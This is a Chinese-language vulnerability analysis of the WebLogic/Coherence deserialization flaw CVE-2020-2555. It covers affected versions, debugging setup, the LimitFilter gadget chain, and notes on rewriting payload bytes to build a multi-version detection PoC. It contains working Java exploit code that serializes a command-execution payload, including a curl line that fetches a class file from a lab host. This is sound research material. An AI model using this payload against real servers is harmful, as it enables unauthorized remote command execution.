## 背景
在2020年1月，互联网上爆出了Weblogic反序列化远程命令执行漏洞（CVE-2020-2555），Oracle Fusion中间件 Oracle
Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic 服务器权限，执行任意命令，风险较大。
漏洞信息曝光之后，互联网中发布几篇该漏洞相关的分析文章以及利用 POC，但公布的 POC 有部分不足之处，导致漏洞检测效率变低，不足之处主要体现在：
**1 目前所有的利用工具都是通过动态编译进行生产 POC 文件而且必须要有 java 环境。**
**2\. 公布的 POC 只是针对单独一个版本有效，无法适应多个 Weblogic 版本。**
漏洞影响情况：
  * Oracle Coherence 3.7.1.17
  * Oracle Coherence & Weblogic 12.1.3.0.0
  * Oracle Coherence & Weblogic 12.2.1.3.0
  * Oracle Coherence & Weblogic 12.2.1.4.0
通过研究发现 Weblogic 10.3.6.0 版本不受影响范围内，虽然该版本默认自带了 Coherence（3.7），通过调试发现该版本默认并未启用
Coherence，所以 Weblogic 10.3.6.0 不在受影响范围内。
**注：**
**1\. 经过大量的测试，我们的 POC 可稳定运行在多个操作系统、多个 weblogic 版本、多个 JDK 版本中。**
**2\. 以上测试及分析环境全部基于内部环境。**
## 漏洞调试分析
**本文基于 Weblogic 12.1.3 版本进行研究分析测试。**
### 调试
修改目录 `user_project/domains/bin` 目录中 `setDomainEnv.cmd` 或者 `setDomainEnv.sh`
文件，加`if %debugFlag == "false"%` 之前加入 `set debugFlag=true`。
拷贝 `Oracle_Home` 目录下所有文件至调试目录，并且 `coherence\lib` 添加 `Libraries`：
配置 `Remote` 方式进行远程调试， ip 设置为开启 `set debugFlag=true` 的服务器 IP， 端口为 `8453` ：
## 漏洞利用
该漏洞主要是因为 `com.tangosol.util.filter.LimitFilter#toString` 方法内部可通过
`m_comparator` 和 `m_oAnchorTop` 可自定义进行设置，形成利用链条导致漏洞的发生，以下为整个利用链条：
    Gadget chain:
            ObjectInputStream.readObject()
                BadAttributeValueExpException.readObject()
                    LimitFilter.toString()
                        ChainedExtractor.extract()
                                ReflectionExtractor.extract()
                                    Method.invoke()
                                        Class.getMethod()
                                ReflectionExtractor.extract()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                ReflectionExtractor.extract()
                                    Method.invoke()
                                        Runtime.exec()
通过利用利用链条，可以基于 [ysoserial](https://github.com/frohoff/ysoserial) 中的
[CommonsCollections5](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections5.java)
进行构造利用 POC：
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            String cmd = "curl http://10.10.10.172:9999/Poc.class";
            cmd = "calc";
            ValueExtractor[] valueExtractors = new ValueExtractor[]{
                    new ReflectionExtractor("getMethod", new Object[]{
                            "getRuntime", new Class[0]
                    }),
                    new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                    new ReflectionExtractor("exec", new Object[]{new String[]{"cmd", "/c", cmd}})
    //                new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/bash","-c", cmd}})
            };
            // chain
            LimitFilter limitFilter = new LimitFilter();
            limitFilter.setTopAnchor(Runtime.class);
            BadAttributeValueExpException expException = new BadAttributeValueExpException(null);
            Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
            m_comparator.setAccessible(true);
            m_comparator.set(limitFilter, new ChainedExtractor(valueExtractors));
            Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, Runtime.class);
            Field val = expException.getClass().getDeclaredField("val");
            val.setAccessible(true);
            val.set(expException, limitFilter);
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("/Users/0nise/IdeaProjects/vuldebug/cve-2020-2555/src/main/java/122130_linux_calc.666"));
            objectOutputStream.writeObject(expException);
            objectOutputStream.close();
        }
### 漏洞分析
该漏洞主要是因为 `com.tangosol.util.filter.LimitFilter#toString` 触发，通过跟踪我们可以看到
`m_oAnchorTop` 为 `classs java.lang.Runtime` ， 以及 `m_comparator` 为
`ValueExtractor` 接口的 `ChainedExtractor` 实现。
核心通过 `extractor.extract` 进行触发，跟踪代码会跳入
`com.tangosol.util.extractor.ChainedExtractor#extract` ，并且将每次执行结果作为参数，通过
`aExtractor[i].extract(oTarget)` 进行执行，第一次 `oTarget` 参数值为 `class
java.lang.Runtime`
跟踪进入 `aExtractor[i].extract(oTarget)` 会跳入
`com.tangosol.util.extractor.ReflectionExtractor#extract` ，最后通过
`method.invoke` 反射执行，也就是说开始执行 `java.lang.Runtime.getRuntime`，最后讲执行的结果进行
`return`，类型为 `java.lang.Runtime`，所以整个方法执行的代码为
`java.lang.Runtime.class.getMethod("getRuntime",new Class[0]);`
第二次将`java.lang.Runtime.getRuntime` （也就是 `java.lang.Runtime`） 作为 `oTarget`
参数值进行传入执行  
进行循环 `method.invoke`，反射执行 `invoke` ，最终执行代码为  
`java.lang.Runtime.class.getMethod("getRuntime",new Class[0]).invoke(null, new
Object[0])` ，最后执行完毕结果为 `java.lang.Runtime` 类，并且将 `return` 提供下次进行调用执行。
最后通过 `java.lang.Runtime.exec` 进行反射执行命令，最终执行的代码为 `runtime.exec(new
String[]{"cmd", "/c", "notepad"})` 达到执行命令的目的，弹出记事本。
### weblogic 10.3.6
weblogic 10.3.6 版本默认自带 coherence_3.7 ，但通过 Debug 调试发现 weblogic 10.3.6 并未启用
coherence_3.7 所以无法针对 weblogic 10.3.6 进行测试，但 coherence_3.7 版本中
`com.tangosol.util.filter.LimitFilter#toString` 漏洞仍然存在，所以 coherence 3.7
版本存在漏洞但 weblogic 10.3.6 默认情况下不存在该漏洞。
## 不足之处
经过分析发现 POC 很多不足之处，导致漏洞检测效率变低，同时无法进行通过其他语言开发调用。
### 动态序列化问题
如果 POC 用于非 java 语言开发的扫描框架时，是非常麻烦的要么是将代码集成
[ysoserial](https://github.com/frohoff/ysoserial)
然后通过进程调用的方式动态生成序列化文件，但该方法会不断的通过进程调用执行代码，会造成很大的资源开销。除了使用这种方法之外还可以通过加载以前的 POC
进行二进制读取并且替换代码重新生成序列化文件。
通过研究分析发现，修改参数内容时变动的内容主要为 `13 5B 4C 6A 61 76 61 2E 6C 61 6E 67 2E 53 74 72 69
6E 67 3B AD D2 56 E7 E9 1D 7B 47 02 00 00 78 70 00 00 00 03 74 00` 字节至 `00 04
65 78 65 63 70 70 76 72 00 11 6A 61 76 61 2E 6C 61 6E 67 2E 52 75 6E 74 69 6D
65 00 00 00 00 00 00 00 00 00 00 00 78 70` 的内容信息，其中左图的参数为 `new String[]{"cmd",
"/c", "notepad"}`，右图的参数为 `new String[]{"cmd", "/c", "calc"}`。
通过分析相同 weblogic 版本中通过 `coherence.jar` 生成的
`payload`，比对其中差异发现参数构造的方式为：每个参数的长度转换为 16 进制，占用 2 个字节，不足用 `0` 补足 + 每个参数值的 Hex 码